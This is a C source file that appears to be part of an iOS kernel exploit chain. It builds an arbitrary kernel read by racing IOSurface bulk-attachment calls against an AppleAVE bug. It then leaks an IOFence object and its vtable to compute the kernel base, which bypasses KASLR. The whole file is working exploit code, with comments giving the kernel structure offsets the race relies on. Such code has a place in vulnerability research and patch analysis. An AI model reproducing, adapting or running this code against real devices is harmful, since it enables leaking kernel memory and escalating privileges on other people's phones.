#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include "IOKitLib.h"
#include <stdint.h>
#include <fcntl.h>
#include <pthread.h>
#include "iosurface_utils.h"
#include "apple_ave_pwn.h"
#include "apple_ave_utils.h"
#include "kernel_read.h"
#include "offsets.h"

static io_connect_t g_surface_conn = 0;
static void * g_surface_kernel_ptr = NULL;
static void * g_surface_buffer = NULL;
static uint32_t g_surface_id_for_arbitrary_read = 0;


/* exclusively for printing
static pthread_mutex_t g_m = PTHREAD_MUTEX_INITIALIZER;
*/

typedef struct bulk_racer_args_s {
	int * should_stop;
	void * address_target;
	uint64_t * out_value;
	uint64_t expected_value;
	uint64_t mask;
} bulk_racer_args_t;

/*
 * Function name: 	kernel_read_cleanup
 * Description:		Frees resources required by the arbitrary kernel read vulnerability.
 * Returns:			kern_return_t.
 */

kern_return_t kernel_read_cleanup() {
	
	kern_return_t ret = KERN_SUCCESS;

	if (g_surface_id_for_arbitrary_read)
	{
		iosurface_utils_release_surface(g_surface_conn, g_surface_id_for_arbitrary_read);
		g_surface_id_for_arbitrary_read = 0;
	}

	if (g_surface_conn)
	{
		IOServiceClose(g_surface_conn);
		g_surface_conn = 0;
	}
	return ret;
}


/*
 * Function name: 	kernel_read_initialize_globals
 * Description:		Initializes IOKit connections and their objects.
 * Returns:			kern_return_t.
 */

static
kern_return_t kernel_read_initialize_globals() {
	
	kern_return_t ret = KERN_SUCCESS;
	char surface_data[IOSURFACE_DICTIONARY_SIZE] = {0};
	ret = iosurface_utils_get_connection(&g_surface_conn);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: opening IOSurfaceRoot connection\n");
		goto cleanup;
	}

	ret = iosurface_utils_create_surface(g_surface_conn, &g_surface_id_for_arbitrary_read, surface_data);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: creating an IOSurface for arbitrary read\n");
		goto cleanup;
	}

	g_surface_buffer = *(void**)surface_data;

cleanup:
	if (KERN_SUCCESS != ret)
	{
		kernel_read_cleanup();
	}
	return ret;
}

/*
 * Function name: 	kernel_read_surface_bulk_race_thread
 * Description:		Sets the bulk attachment appropriately for the info leak and checks if its actually rewritten.
 * Returns:			kern_return_t.
 */

static
void* kernel_read_surface_bulk_race_thread(void * _args) {
	
	kern_return_t ret = KERN_SUCCESS;
	bulk_racer_args_t * args = (bulk_racer_args_t*)_args;
	char input_buffer[IOSURFACE_BULK_ATTACHMENT_SIZE] = {0};
	char output_buffer[IOSURFACE_BULK_ATTACHMENT_SIZE] = {0};
	unsigned long counter = 0;
	void * should_stop = args->should_stop;

	*(void**)input_buffer = args->address_target;

	usleep(100000);

	/*
		We want to leak fenceWaitingQueue. As a result, bulk0 must be NULL.
		so we put the address of fenceWaitingQueue-0x38.
		In that case, fenceWaitingQueue will be leaked (base+0x38), and base+0x50 will be NULL (bulk0).
		00000210 fenceCurrentQueue DCQ ?                 ; offset
		00000218 fenceCurrentQueueTail DCQ ?             ; offset
		00000220 fenceWaitingQueue DCQ ?                 ; offset
		00000228 fenceWaitingQueueTail DCQ ?             ; offset
		00000230 fence_allow_tearing DCB ?
		00000231 field_0x231     DCB ?
		00000232 field_0x232     DCB ?
		00000233 field_0x233     DCB ?
		00000234 bulk0           (null) ?
		00000244 bulk1           (null) ?
		00000254 bulk2           (null) ?
		00000264 bulk3           DCQ ?                   ; offset
		0000026C bulk4           DCB ?
		0000026D bulk5           DCB ?
		0000026E YcbCr_matrix_also DCB ?
		0000026F bulk6           DCB ?
		00000270 bulk7           DCB ?
		00000271 bulk8           DCB ?
		00000272 bulk9           DCB ?
		00000273 bulk10          DCB ?
	*/

	iosurface_utils_set_bulk_attachment_flag(input_buffer, 1);

	printf("[INFO]:block to leak: %p\n", *(void**)input_buffer);

	while(!*(int*)should_stop) {

		if (counter++ >= 0x10000)
		{
			printf("[INFO]:timeout leak\n");
			break;
		}

		ret = iosurface_utils_set_bulk_attachment(g_surface_conn, g_surface_id_for_arbitrary_read,
			input_buffer);

		if (KERN_SUCCESS != ret)
		{
			printf("[ERROR]: setting bulk attachment\n");
			break;
		}

		ret = iosurface_utils_get_bulk_attachment(g_surface_conn, g_surface_id_for_arbitrary_read,
			output_buffer);

		if (KERN_SUCCESS != ret)
		{
			printf("[Error]: getting bulk attachment\n");
		}

		if (NULL != *(void**)(output_buffer+0x20) && 0 == *(uint32_t*)(output_buffer + 0x8))
		{
			if (args->mask && ((*(uint64_t*)(output_buffer + 0x20) & args->mask) != (args->expected_value & args->mask)))
			{
				printf("[INFO]:0x%llx & 0x%llx (0x%llx) != 0x%llx & 0x%llx (0x%llx)\n",
					*(uint64_t*)(output_buffer + 0x20), args->mask,
					*(uint64_t*)(output_buffer + 0x20) & args->mask,
					args->expected_value, args->mask,
					args->expected_value & args->mask);
				continue;
			}

			/* This value means the race failed. */
			if (*(unsigned int*)(output_buffer + 0x20) == 0xf6000)
			{
				continue;
			}

			printf("[INFO]:Leaked IOMemoryDescriptor: %p\n", *(void**)(output_buffer+0x20));
			*args->out_value = *(uint64_t*)(output_buffer + 0x20);
			break;
		}
	}

/*
	pthread_mutex_lock(&g_m);
	printf("[INFO]:Bulk setter quitted");
	for(i = 0; i <= 0x20; i += 8) {
		printf("[INFO]:leak[0x%x] = %p", i, *(void**)(output_buffer+i));
	}
	pthread_mutex_unlock(&g_m);
*/
	*(int*)should_stop = 1;

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wint-conversion"
	return ret;
#pragma clang diagnostic pop

}

/*
 * Function name: 	kernel_read_wait_for_all_threads
 * Description:		Joins an array of pthread_t.
 * Returns:			void.
 */

static
void kernel_read_wait_for_all_threads(pthread_t * threads, size_t array_length) {
	
	unsigned long i = 0;
	for(i = 0; i < array_length; ++i) {
		pthread_join(threads[i], NULL);
	}
}

/*
 * Function name: 	kernel_read_read_address
 * Description:		Reads an address from the kernel.
 					expected_value and mask are values that can help with identifying the right value (or part of it)
 * Returns:			kern_return_t and the value from the kernel as an output parameter.
 */

static
kern_return_t kernel_read_read_address(void * kernel_ptr, uint64_t * value, uint64_t expected_value, uint64_t mask) {
	
	kern_return_t ret = KERN_SUCCESS;
	pthread_t bulk_setter[NUMBER_OF_BULK_RACERS];
	int should_stop = 0;
	uint64_t out_value = 0;
	char input_buffer[IOSURFACE_BULK_ATTACHMENT_SIZE] = {0};

	bulk_racer_args_t args = {
		.should_stop = &should_stop,
		/* we reduce 0x18 because we are actually going to leak the first 32 bits of address + 0x18 */
		.address_target = kernel_ptr - 0x18,
		.out_value = &out_value,
		.expected_value = expected_value,
		.mask = mask
	};

	int i = 0;
	for(i = 0; i < NUMBER_OF_BULK_RACERS; ++i) {
		if (pthread_create(&(bulk_setter[i]), NULL, kernel_read_surface_bulk_race_thread, &args))
		{
			printf("[ERROR]: creating bulk setter thread");
			ret = KERN_ABORTED;
			goto cleanup;
		}
	}

	while(!should_stop) {
		apple_ave_pwn_put_data_in_bulk(g_surface_kernel_ptr + IOSURFACE_OFFSET_BULK_ATTACHMENT);
	}

	kernel_read_wait_for_all_threads(bulk_setter, NUMBER_OF_BULK_RACERS);

	*value = (uint64_t)out_value;

cleanup:
	should_stop = 1;

	kernel_read_wait_for_all_threads(bulk_setter, NUMBER_OF_BULK_RACERS);

	/* Cleans up the surface's attachment */
	iosurface_utils_set_bulk_attachment_flag(input_buffer, IOSURFACE_BULKATTACHMENT_FLAG_SET_ALL_BULKS);
	iosurface_utils_set_bulk_attachment(g_surface_conn, g_surface_id_for_arbitrary_read,
			input_buffer);

	return ret;
}



/*
 * Function name: 	kernel_read_leak_kernel_base
 * Description:		Leaks the kernel base using another vulnerability.
 					Please note that this function might block a little bit.
 * Returns:			kern_return_t and the kernel base in the output params.
 */

kern_return_t kernel_read_leak_kernel_base(uint64_t * kernel_base) {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t value = 0;
	void * iofence = NULL;
	uint64_t iofence_vtable = 0;

	/* Read the IOFence object first */
	ret = kernel_read_read_address((char*)apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210, &value,
		0, 0);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: leaking IOFence object");
		goto cleanup;
	}

	printf("[INFO]:Before ORing: %p\n", (void*)value);

	value |= 0xfffffff000000000;
	iofence = (void*)value;

	printf("[INFO]:IOFence: %p\n", iofence);
	//printf("[INFO]:IOFence, real: %p", (void*)r64(apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210));

	/* Read the vtable from the IOFence object */
	ret = kernel_read_read_address(iofence, &value, OFFSET(iofence_vtable_offset), 0xfff);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: leaking IOFence's vtable\n");
		goto cleanup;
	}

	value |= 0xfffffff000000000;
	iofence_vtable = value;

	printf("[INFO]: IOFence's vtable: %llx\n", iofence_vtable);
	//printf("[INFO]:IOFence's vtable, real: %p", (void*)r64(r64(apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210)));

	*kernel_base = (iofence_vtable - OFFSET(iofence_vtable_offset));
/*
	usleep(10000);

	iofence_vtable = r64(apple_ave_pwn_get_bad_surface_kernel_ptr());

	printf("[INFO]:IOSurface vtable: %p", iofence_vtable);

	*kernel_base = iofence_vtable - (0xFFFFFFF006EF4778 - OFFSET(kernel_base));

	printf("[INFO]:kernel base: %p", *kernel_base);
	printf("[INFO]:kernel base magic: %p", r64(*kernel_base));
*/

cleanup:
	return ret;
}





/*
 * Function name: 	kernel_read_init
 * Description:		Initializes the camera connection for the establishment of an arbitrary read.
 * Returns:			kern_return_t.
 */

kern_return_t kernel_read_init() {
	
	kern_return_t ret = KERN_SUCCESS;

	ret = kernel_read_initialize_globals();
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: initializing globals");
		goto cleanup;
	}

	ret = apple_ave_pwn_get_surface_kernel_address(g_surface_id_for_arbitrary_read, &g_surface_kernel_ptr);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: getting the kernel pointer of our special IOSurface object %d",
		 g_surface_id_for_arbitrary_read);
		goto cleanup;
	}

	printf("[INFO]:kernel pointer of IOSurface object %d is %p\n", g_surface_id_for_arbitrary_read, g_surface_kernel_ptr);

cleanup:
	if (KERN_SUCCESS != ret)
	{
		kernel_read_cleanup();
	}

	return ret;
}
